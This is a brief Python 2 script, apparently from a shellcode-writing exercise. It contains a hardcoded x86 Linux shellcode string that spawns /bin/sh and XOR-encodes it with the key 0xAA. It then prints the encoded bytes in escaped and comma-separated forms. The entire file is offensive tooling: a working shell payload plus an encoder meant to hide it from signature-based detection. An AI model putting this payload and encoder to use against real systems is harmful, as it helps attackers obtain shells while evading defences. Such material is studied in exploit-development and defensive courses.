#!/usr/bin/python

# Python xor encoder
shellcode = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x1c\xfc\xb1\x08\x8b\x34\x24\x50\x53\x52\x89\xe7\xf3\xa4\xb0\x0b\x89\xe3\x52\x53\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xdf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68")

encoded = ""
encoded2 = ""

print "Encoded shellcode ..."

for x in bytearray(shellcode) : 
    # Xor encoding
    y = x^0xAA
    encoded += '\\x'
    encoded += '%02x' %y
    
    encoded2 += '0x' 
    encoded2 += '%02x,' %y
    
print encoded + "\n"
print encoded2 + "\n"
print 'Len: %d' % len(bytearray(shellcode))
